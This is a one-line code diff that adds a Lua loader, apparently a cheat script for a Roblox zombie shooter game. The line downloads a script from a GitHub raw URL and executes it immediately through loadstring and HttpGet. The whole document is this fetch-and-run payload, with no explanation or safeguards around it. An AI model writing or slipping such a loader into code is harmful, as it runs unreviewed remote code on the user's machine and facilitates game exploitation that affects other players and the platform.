@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/zombies-hypershot-spam1-pu0748ksofi0we.lua"))()
